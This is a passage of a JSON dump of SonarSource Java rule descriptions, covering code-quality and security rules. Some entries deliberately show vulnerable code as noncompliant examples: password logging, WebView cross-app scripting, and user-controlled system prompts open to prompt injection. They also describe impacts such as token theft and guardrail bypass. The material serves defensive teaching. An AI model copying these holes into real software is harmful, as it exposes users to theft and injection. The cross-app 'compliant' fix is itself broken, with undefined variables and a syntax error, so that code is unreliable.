{"componentChunkName":"component---src-components-page-template-tsx","path":"/java/RSPEC-2127/","result":{"data":{"allFile":{"nodes":[{"childLanguageJson":{"rules":[{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>As stated per effective java :</p>\n<blockquote>\n  <p>Varargs methods are a convenient way to define methods that require a variable number of arguments, but they should not be overused. They can\n  produce confusing results if used inappropriately.</p>\n</blockquote>\n<h3>Noncompliant code example</h3>\n<pre>\nvoid fun ( String... strings )\t// Noncompliant\n{\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/DCL57-J.+Avoid+ambiguous+overloading+of+variable+arity+methods\">CERT, DCL57J</a> -\n  Avoid ambiguous overloading of variable arity methods </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-923","summary":"Functions should not be defined with a variable number of arguments","tags":["cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When the return value of a function call contains the operation status code, this value should be tested to make sure the operation completed\nsuccessfully.</p>\n<p>This rule raises an issue when the return values of the following are ignored:</p>\n<ul>\n  <li> <code>java.io.File</code> operations that return a status code (except <code>mkdirs</code>) </li>\n  <li> <code>Iterator.hasNext()</code> </li>\n  <li> <code>Enumeration.hasMoreElements()</code> </li>\n  <li> <code>Lock.tryLock()</code> </li>\n  <li> non-void <code>Condition.await*</code> methods </li>\n  <li> <code>CountDownLatch.await(long, TimeUnit)</code> </li>\n  <li> <code>Semaphore.tryAcquire</code> </li>\n  <li> <code>BlockingQueue</code>: <code>offer</code>, <code>remove</code> </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomething(File file, Lock lock) {\n  file.delete();  // Noncompliant\n  // ...\n  lock.tryLock(); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomething(File file, Lock lock) {\n  if (!lock.tryLock()) {\n    // lock failed; take appropriate action\n  }\n  if (!file.delete()) {\n    // file delete failed; take appropriate action\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/xzdGBQ\">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/TTZGBQ\">CERT, FIO02-J.</a> - Detect and handle file-related errors </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/754\">CWE-754 - Improper Check for Unusual Exceptional Conditions</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-899","summary":"Return values should not be ignored when they contain the operation status code","tags":["cwe","error-handling","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an\ninfinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an\ninfinite loop.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nfor (int i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.\n{\n  //...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfor (int i = 1; i &lt;= 10; i += 2)  // Compliant\n{\n  //...\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>\n<ul>\n  <li> starts below the ending value and is incremented by 1 on each iteration. </li>\n  <li> starts above the ending value and is decremented by 1 on each iteration. </li>\n</ul>\n<p>Equality operators are also ignored when the test is against <code>null</code>.</p>\n<pre>\nfor (int i = 0; arr[i] != null; i++) {\n  // ...\n}\n\nfor (int i = 0; (item = arr[i]) != null; i++) {\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/835\">CWE-835 - Loop with Unreachable Exit Condition ('Infinite Loop')</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/x9YxBQ\">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-888","summary":"Equality operators should not be used in \"for\" loop termination conditions","tags":["cwe","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>\n<ul>\n  <li> It can significantly impair the readability of the code. </li>\n  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>\n  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nu8a = ++u8b + u8c--;\nfoo = bar++ / 4;\n</pre>\n<h3>Compliant solution</h3>\n<p>The following sequence is clearer and therefore safer:</p>\n<pre>\n++u8b;\nu8a = u8b + u8c;\nu8c--;\nfoo = bar / 4;\nbar++;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/StYxBQ\">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IXw-BQ\">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side effects </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/NDdGBQ\">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the same\n  object within an expression </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-881","summary":"Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex\nstatements. However, this does not mean that parentheses should be gratuitously added around every operation.</p>\n<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational\noperators are used together in a condition, and for other operator combinations according to the following table:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 16.6666%;\">\n    <col style=\"width: 16.6666%;\">\n    <col style=\"width: 16.6666%;\">\n    <col style=\"width: 16.6666%;\">\n    <col style=\"width: 16.6666%;\">\n    <col style=\"width: 16.667%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th></th>\n      <th><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></th>\n      <th><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></th>\n      <th><code>&amp;</code></th>\n      <th><code>^</code></th>\n      <th><code>|</code></th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></p></td>\n      <td></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n    </tr>\n    <tr>\n      <td><p><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></p></td>\n      <td><p>x</p></td>\n      <td></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n    </tr>\n    <tr>\n      <td><p><code>&amp;</code></p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n    </tr>\n    <tr>\n      <td><p><code>^</code></p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td></td>\n      <td><p>x</p></td>\n    </tr>\n    <tr>\n      <td><p><code>|</code></p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td><p>x</p></td>\n      <td></td>\n    </tr>\n  </tbody>\n</table>\n<p>This rule also raises an issue when the \"true\" or \"false\" expression of a ternary operator is not trivial and not wrapped inside parentheses.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nx = a + b - c;\nx = a + 1 &lt;&lt; b;  // Noncompliant\ny = a == b ? a * 2 : a + b;  // Noncompliant\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant\nif (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nx = a + b - c;\nx = (a + 1) &lt;&lt; b;\ny = a == b ? (a * 2) : (a + b);\n\nif ( a &gt; b || c &lt; d || a == d) {...}\nif ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}\nif ( (a = f(b,c)) == 1) { ... }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/YdYxBQ\">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ZzZGBQ\">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/783\">CWE-783 - Operator Precedence Logic Error</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-864","summary":"Limited dependence should be placed on operator precedence","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Using upper case literal suffixes removes the potential ambiguity between \"1\" (digit 1) and \"l\" (letter el) for declaring literals.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nlong long1 = 1l; // Noncompliant\nfloat float1 = 1.0f; // Noncompliant\ndouble double1 = 1.0d; // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nlong long1 = 1L;\nfloat float1 = 1.0F;\ndouble double1 = 1.0D;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/cdYxBQ\">CERT DCL16-C.</a> - Use \"L,\" not \"l,\" to indicate a long value </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DZGBQ\">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-818","summary":"Literal suffixes should be upper case","tags":["convention","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Passing an empty finisher to <code>Gatherer.of</code> or to <code>Gatherer.ofSequential</code> provides no additional value and removing the\nfinisher clearly communicates that no finisher is applied.</p>\n<h2>How to fix it</h2>\n<p>Call the overload of <code>Gatherer.of</code> or <code>Gatherer.ofSequential</code> that does not take a finisher.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nGatherer&lt;Integer, AtomicInteger, Integer&gt; gatherer = Gatherer.ofSequential(\n  () -&gt; new AtomicInteger(-1),\n  (state, number, downstream) -&gt; {\n    if (state.get() &lt; 0) {\n      state.set(number);\n      return true;\n    }\n    return downstream.push(number - state.get());\n  },\n  Gatherer.defaultFinisher()); // Noncompliant: useless finisher\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nGatherer&lt;Integer, AtomicInteger, Integer&gt; gatherer = Gatherer.ofSequential(\n  () -&gt; new AtomicInteger(-1),\n  (state, number, downstream) -&gt; {\n    if (state.get() &lt; 0) {\n      state.set(number);\n      return true;\n    }\n    return downstream.push(number - state.get());\n  }); // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Oracle Documentation - <a href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/util/stream/Gatherer.html\">Gatherer API</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7629","summary":"When a defaultFinisher is passed to a Gatherer factory, use the overload that does not take a finisher","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<p>On client-side applications, such as Android apps, logging sensitive information like passwords, personal data, or API keys, poses a significant\nsecurity risk. While direct log access by other applications is restricted on modern Android, these logs can still be read by anyone with physical\ndevice access (e.g. via Logcat), on rooted devices, or by malicious apps with special permissions.</p>\n<p>Even if not directly accessible to other apps, they might be stored on the device in plaintext, making them vulnerable if the device is lost,\nstolen, or compromised. Furthermore, these logs can be inadvertently collected and transmitted by crash reporting or analytics services, exposing\nsensitive data to third parties. This can lead to compromised user accounts, data breaches, and a loss of trust in the application.</p>\n<h2>Why is this an issue?</h2>\n<p>Logging sensitive data creates a persistent security risk, as logs can remain on a device or in backups indefinitely. This exposes credentials and\npersonal information to malware or anyone who gains physical or remote access to the device, long after the data was recorded.</p>\n<h3>What is the potential impact?</h3>\n<p>A breach resulting from logged sensitive data can cause irreparable reputational damage and erode user trust. This can lead to customer churn and\nnegative publicity. Furthermore, such an incident can trigger significant legal and financial repercussions, including heavy fines under data\nprotection regulations like GDPR and CCPA, and potential class-action lawsuits. This places the business in a state of extended liability, requiring\nit to manage ongoing incident response, regulatory scrutiny, and legal obligations to all affected parties.</p>\n<h2>How to fix it in Android</h2>\n<p>To prevent the exposure of sensitive data in Android application logs, the primary strategy is to avoid logging such information entirely.\nDevelopers should implement strict logging policies that explicitly forbid the inclusion of credentials, personal identifiers, or other confidential\nuser data. When logging is necessary for debugging, it should be restricted to debug builds only. This can be achieved by leveraging tools like\nProGuard or R8 to automatically strip <code>Log</code> calls from release builds. For cases where some user-related data is essential for context,\nimplement data masking or sanitization techniques to redact the sensitive portions before logging.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\npublic class LoginActivity extends Activity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        String username = ((EditText) findViewById(R.id.username)).getText().toString();\n        String password = ((EditText) findViewById(R.id.password)).getText().toString();\n\n        Log.i(\"LoginAttempt\", \"Login attempt: \" + username + \" with password: \" + password); // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The simplest way to fix this is to not log sensitive data.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\npublic class LoginActivity extends Activity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        String username = ((EditText) findViewById(R.id.username)).getText().toString();\n        String password = ((EditText) findViewById(R.id.password)).getText().toString();\n\n        Log.i(\"LoginAttempt\", \"Login attempt: \" + username);\n    }\n}\n</pre>\n<p>There exist cases where logs need to be kept in debug builds, however. In these cases, it is possible to use Proguard rules to strip logging calls\nin release builds at compile time. This example shows how to remove all logging calls of level <code>INFO</code> and lower by writing an extra rule in\nthe <code>proguard-rules.pro</code> file.</p>\n<pre>\n-assumenosideeffects class android.util.Log {\n  static *** i(...);\n  static *** d(...);\n  static *** v(...);\n  static *** isLoggable(...);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/security-tips#user-data\">Security checklist - User data</a>\n  </li>\n  <li> Android Documentation - <a href=\"https://source.android.com/docs/security/best-practices/privacy#logging-data\">Privacy security best practices\n  - Data logging</a> </li>\n  <li> Android Documentation - <a href=\"https://source.android.com/docs/core/tests/debug/understanding-logging\">Understanding logging</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m6-inadequate-privacy-controls\">Mobile Top 10 2024 Category M6 -\n  Inadequate Privacy Controls</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m9-insecure-data-storage.html\">Mobile Top 10 2024 Category M9 -\n  Insecure Data Storage</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532.html\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7610","summary":"Sensitive information should not be logged in production builds","tags":["injection"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<p>Cross-App Scripting is a variant of XSS that targets mobile applications using a WebView to display web content. It happens if the application\naccepts data from another, potentially malicious, application on the same device and passes it into its WebView without proper validation.</p>\n<p>An attacker can exploit this by creating a malicious application that sends specially prepared data to the vulnerable app. The vulnerability is\ntriggered when the application passes theattackerâs malicious data to one of the WebView methods that executes HTML or JavaScript.</p>\n<h2>Why is this an issue?</h2>\n<p>When a malicious application successfully executes its own code inside your applicationâs WebView, it can operate within the trusted environment of\nyour app. This means it can misuse the permissions and access that your users have granted to your WebView. Depending on the case, an accacker could\nexecute JavaScript, redirect to phishing pages or access applicationâs private files.</p>\n<h3>What is the potential impact?</h3>\n<h4>Theft of Sensitive Information</h4>\n<p>If the WebView shows private user details, such as personal information, financial data, or confidential documents, a malicious script can copy\nthis data and send it to an attacker. The script can also access session information, like cookies or authentication tokens.</p>\n<h4>Account Takeover</h4>\n<p>If an attacker obtains a userâs session token, they can often impersonate that user. The attacker can use the stolen token to access the userâs\naccount from their own device without needing the userâs password. Once inside, they could have full access to the account, allowing them to view\nprivate data, change account settings, or lock the original user out.</p>\n<h4>Displaying Deceptive Content</h4>\n<p>An attackerâs script can change the content and appearance of the page shown in the WebView. For example, the script could display a fake login\nscreen that looks identical to your appâs real one. If a user enters their username and password into this fake form, the script sends the credentials\nto the attacker. This technique is a form of phishing.</p>\n<h4>Performing Unauthorized Actions</h4>\n<p>Some applications set up a bridge that allows JavaScript in a WebView to communicate with the native part of the Android application. If this is\nthe case, a malicious script could potentially use this bridge to perform actions on behalf of the user. Depending on your appâs features, this could\ninclude sending messages, modifying files, or accessing contacts.</p>\n<h2>How to fix it in Android</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\npublic class ExampleActivity extends AppCompatActivity {\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView aWebView = new WebView(this);\n        aWebView.getSettings().setJavaScriptEnabled(true);\n        setContentView(aWebView);\n\n        String name = getIntent().getStringExtra(\"name\");\n        if (name == null) {\n            name = \"Guest\";\n        }\n\n        aWebView.evaluateJavascript(\"greeting('\" + name + \"')\", null); // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\npublic class ExampleActivity extends AppCompatActivity {\n\n    private static final Pattern NAME_REGEX = Pattern.compile(\"^[a-zA-Z ]+$\");\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView aWebView = new WebView(this);\n        aWebView.getSettings().setJavaScriptEnabled(true);\n        setContentView(aWebView);\n\n        String name = getIntent().getStringExtra(\"name\");\n        if (name == null) {\n            uname = \"Guest\";\n        }\n\n        if (NAME_REGEX.matcher(untrustedName).matches()) {\n            aWebView.evaluateJavascript(\"greeting('\" + name + \"')\";, null);\n        }\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/risks/cross-app-scripting\">Cross-app scripting</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation\">Mobile Top 10 2024 Category M4\n  - Insufficient Input/Output Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222602\">Application Security and\n  Development: V-222602</a> - The application must protect from Cross-Site Scripting (XSS) vulnerabilities. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7606","summary":"WebViews should not be vulnerable to cross-app scripting attacks","tags":["cwe","injection"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In a Large Language Model conversation, different roles have a clear hierarchy and have distinctly different abilities to influence the\nconversation, define its boundaries, and control the actions of other participants.</p>\n<p>Nowadays, the trio of <code>system</code>, <code>user</code>, and <code>assistant</code> defining the core roles of many Large Language Model (LLM)\ninteractions is expanding to include a more diverse set of roles, such as developer, tool, function, and even more nuanced roles in multi-agent\nsystems.</p>\n<p>Injecting unchecked user input in privileged prompts, such as <code>system</code>, gives unauthorized third parties the ability to break out of\ncontexts and constraints that you assume the LLM follows.</p>\n<h3>What is the potential impact?</h3>\n<p>When attackers detect privilege discrepancies while injecting into your LLM application, they then map out their capabilities in terms of actions\nand knowledge extraction, and then act accordingly.<br> The impact is very dependent on the \"screenplay\" of the intended dialogues between model,\nuser(s), third-parties, tools, which you had in mind while designing the application.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data manipulation</h4>\n<p>A malicious prompt injection enables data leakages or possibly impacting the LLM discussions of other users.</p>\n<h4>Denial of service and code execution</h4>\n<p>Malicious prompt injections could allow the attacker to possibly leverage internal tooling such as MCP, to delete sensitive or important data, or\nto send tremendous amounts of requests to third-party services, leading to financial losses or getting banned from such services.<br> This threat is\nparticularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in OpenAI</h2>\n<h3>Code examples</h3>\n<p>In the following piece of code, control over sensitive roles such as <code>system</code> and <code>developer</code> provides a clear way to exploit\nthe underlying model, its proprietary knowledge (e.g., RAG), and its capabilities (with MCPs).</p>\n<p>The compliant solution revokes any external possibility of controlling sensitive roles by just hardcoding the system and developer messages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@RestController\n@RequestMapping(\"/example\")\npublic class ExampleController {\n    private final OpenAIClient client;\n    @PostMapping(\"/example\")\n    public ResponseEntity&lt;?&gt; example(@RequestBody Map&lt;String, String&gt; payload) {\n        String promptText = payload.get(\"prompt_text\");\n        String systemText = payload.get(\"sys_text\");\n        String developerText = payload.get(\"dev_text\");\n        ChatCompletionCreateParams request = ChatCompletionCreateParams.builder()\n            .model(ChatModel.GPT_3_5_TURBO)\n            .maxCompletionTokens(2048)\n            .addSystemMessage(systemText)\n            .addDeveloperMessage(developerText)\n            .addUserMessage(promptText)\n            .build();\n        var completion = client.chat().completions().create(request);\n        return ResponseEntity.ok(\n            Map.of(\n                \"response\",\n                completion.choices().stream()\n                    .flatMap(choice -&gt; choice.message().content().stream())\n                    .collect(Collectors.joining(\" | \"))\n            )\n        );\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@RestController\n@RequestMapping(\"/example\")\npublic class ExampleController {\n    private final OpenAIClient client;\n    @PostMapping(\"/example\")\n    public ResponseEntity&lt;?&gt; example(@RequestBody Map&lt;String, String&gt; payload) {\n        String promptText = payload.get(\"prompt_text\");\n        ChatCompletionCreateParams request = ChatCompletionCreateParams.builder()\n            .model(ChatModel.GPT_3_5_TURBO)\n            .maxCompletionTokens(2048)\n            .addSystemMessage(\"\"\"\n            You are \"ExampleBot\", a friendly and professional AI assistant [...]\n            Your role is to [...]\n            \"\"\")\n            .addDeveloperMessage(\"\"\"\n            // Developer Configuration &amp; Safety Wrapper\n            1. The user's query will first be processed by [...]\n            2. etc.\n            \"\"\")\n            .addUserMessage(promptText)\n            .build();\n        var completion = client.chat().completions().create(request);\n        return ResponseEntity.ok(\n            Map.of(\n                \"response\",\n                completion.choices().stream()\n                    .flatMap(choice -&gt; choice.message().content().stream())\n                    .collect(Collectors.joining(\" | \"))\n            )\n        );\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Explicitly stem the LLM context</h4>\n<p>While designing an LLM application, and particularly at the stage where you create the \"screenplay\" of the intended dialogues between model,\nuser(s), third-parties, tools, keep the <strong>least privilege</strong> principle in mind.</p>\n<p>Start by providing any external third-party or user with the least amount of capabilities or information, and only level up their privileges\n<strong>intentionally</strong>, e.g. when a situation (like tool calls) requires it.</p>\n<p>Another short-term hardening approach is to add AI guardrails to your LLM, such as additionnal prompts forbidding the model from generating certain\noutputs.<br> While creating these, keep in mind that deny-list-based filtering can be complex to maintain in the long-term <strong>and</strong> can\nmost of the time be creatively bypassed.</p>\n<h2>Resources</h2>\n<h2>Standards</h2>\n<ul>\n  <li> OWASP GenAI - <a href=\"https://genai.owasp.org/llmrisk/llm01-prompt-injection/\">Top 10 2025 Category LLM01 - Prompt Injection</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-7518","summary":"Privileged prompts should not be vulnerable to injection attacks","tags":["injection"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Stateless stream gatherers, which process each element of the stream independently, donât need an initializer function. Thatâs because the role of\nthe initializer function is to set up the gathererâs private state object.</p>\n<p>The gatherer interface provides factory methods that create gatherers without taking an initializer as an argument:</p>\n<ul>\n  <li> <code>ofSequential(Gatherer.Integrator&lt;Void,T,R&gt; integrator)</code> </li>\n  <li> <code>ofSequential(Gatherer.Integrator&lt;Void,T,R&gt; integrator, BiConsumer&lt;Void, Gatherer.Downstream&lt;? super R&gt;&gt;\n  finisher)</code> </li>\n</ul>\n<p>Using these specific factory methods to create stateless gatherers is preferable because it clearly communicates their stateless nature.</p>\n<p>This rule reports the use of <code>ofSequential(Gatherer.Integrator&lt;Void,T,R&gt; integrator, BiConsumer&lt;Void, Gatherer.Downstream&lt;? super\nR&gt;&gt; finisher)</code> when it returns a stateless gatherer.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate static Gatherer inRange(int start, int end) {\n    return Gatherer.&lt;Integer, Void, Integer&gt;ofSequential(\n      () -&gt; null, // Noncompliant: unnecessary initializer\n      (_, element, downstream) -&gt; {\n        if (element &gt;= start &amp;&amp; element &lt;= end)\n          return downstream.push(element - start);\n        return !downstream.isRejecting();\n      },\n      (_, downstream) -&gt; downstream.push(-1)\n    );\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate static Gatherer inRange(int start, int end) {\n    return Gatherer.&lt;Integer, Integer&gt;ofSequential(\n      (_, element, downstream) -&gt; {\n        if (element &gt;= start &amp;&amp; element &lt;= end)\n          return downstream.push(element - start);\n        return !downstream.isRejecting();\n      },\n      (_, downstream) -&gt; 